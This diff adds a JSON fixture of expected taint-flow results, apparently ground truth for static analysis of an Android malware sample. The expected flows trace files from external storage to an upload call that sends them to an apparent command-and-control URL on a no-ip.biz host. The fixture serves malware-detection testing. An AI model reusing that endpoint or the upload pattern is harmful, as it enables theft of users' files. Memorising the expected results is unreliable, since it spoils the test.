@@ -1,0 +1,29 @@
+{
+    "expected": [
+        {
+            "source": "$r1 = staticinvoke <android.os.Environment: java.io.File getExternalStorageDirectory()>()",
+            "sink": "virtualinvoke $r3.<org.springframework.web.client.RestTemplate: org.springframework.http.ResponseEntity exchange(java.lang.String,org.springframework.http.HttpMethod,org.springframework.http.HttpEntity,java.lang.Class,java.lang.Object[])>(\"http://myvf.no-ip.biz:8086//app//do.php\", $r17, $r4, class \"Ljava/lang/String;\", $r18)",
+            "sourceMethod": "public void register()",
+            "sinkMethod": "private void upPst(File file, String name, boolean vd)"
+        },
+        {
+            "source": "specialinvoke $r4.<java.io.File: void <init>(java.lang.String)>($r9)",
+            "sink": "virtualinvoke $r3.<org.springframework.web.client.RestTemplate: org.springframework.http.ResponseEntity exchange(java.lang.String,org.springframework.http.HttpMethod,org.springframework.http.HttpEntity,java.lang.Class,java.lang.Object[])>(\"http://myvf.no-ip.biz:8086//app//do.php\", $r17, $r4, class \"Ljava/lang/String;\", $r18)",
+            "sourceMethod": "public void register()",
+            "sinkMethod": "private void upPst(File file, String name, boolean vd)"
+        },
+        {
+            "source": "specialinvoke $r4.<java.io.File: void <init>(java.lang.String)>($r12)",
+            "sink": "$r1 = virtualinvoke $r2.<java.io.File: java.lang.String getName()>()",
+            "sourceMethod": "public void upFF(String folder_, String flagOk_, String flagIndex_, boolean vid_)",
+            "sinkMethod": "public String getFilename()"
+        },
+        {
+            "source": "specialinvoke $r4.<java.io.File: void <init>(java.lang.String)>($r8)",
+            "sink": "$r1 = virtualinvoke $r2.<java.io.File: java.lang.String getName()>()",
+            "sourceMethod": "public void upFC(Cursor cursor_, String flagOk_, String flagIndex_)",
+            "sinkMethod": "public String getFilename()"
+        }
+    ],
+    "unExpected": []
+}
